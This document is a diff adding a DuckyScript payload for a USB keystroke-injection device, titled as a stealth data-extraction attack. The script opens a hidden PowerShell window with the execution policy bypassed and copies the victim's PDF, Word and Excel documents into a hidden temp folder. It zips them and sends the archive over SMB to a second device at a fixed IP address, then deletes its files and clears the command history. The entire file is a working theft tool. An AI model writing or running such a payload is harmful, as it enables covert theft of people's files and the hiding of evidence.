@@ -1,0 +1,66 @@
+# ============================================
+# STEALTH EXTRACTION - DUAL DONGLE
+# ============================================
+# Purpose: Silent data extraction
+# Time: 90 seconds
+# Dongle 1: USB injection
+# Dongle 2: WiFi exfiltration
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+# PHASE 1: USB Injection (Dongle 1)
+DELAY 2000
+
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 3000
+
+# Create encrypted container
+STRING $key = "D3n14l0f53rv1c3"; $td = "$env:TEMP\.stealth"
+ENTER
+STRING md $td -Force
+ENTER
+DELAY 200
+
+# Extract data silently
+STRING Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -Include "*.pdf","*.doc*","*.xls*" | Copy-Item -Destination $td -Force
+ENTER
+DELAY 5000
+
+# Compress and encrypt
+STRING Compress-Archive -Path "$td\*" -DestinationPath "$td\data.zip" -Force
+ENTER
+DELAY 1000
+
+# Calculate checksum for integrity
+STRING $hash = Get-FileHash "$td\data.zip" -Algorithm SHA256 | Select-Object -ExpandProperty Hash
+ENTER
+DELAY 200
+
+# Save hash for verification
+STRING echo $hash > "$td\checksum.txt"
+ENTER
+DELAY 100
+
+# PHASE 2: WiFi Exfiltration (Dongle 2)
+# Dongle 2 connects to target WiFi
+# Receives data from Dongle 1 via USB network
+
+STRING $dongle2 = "4.3.2.2"
+ENTER
+DELAY 100
+
+# Transfer via SMB to Dongle 2
+STRING Copy-Item "$td\data.zip" "\\$dongle2\share\" -Force
+ENTER
+DELAY 2000
+
+# Clean traces
+STRING Remove-Item $td -Recurse -Force
+ENTER
+STRING Clear-History
+ENTER
+STRING exit
+ENTER
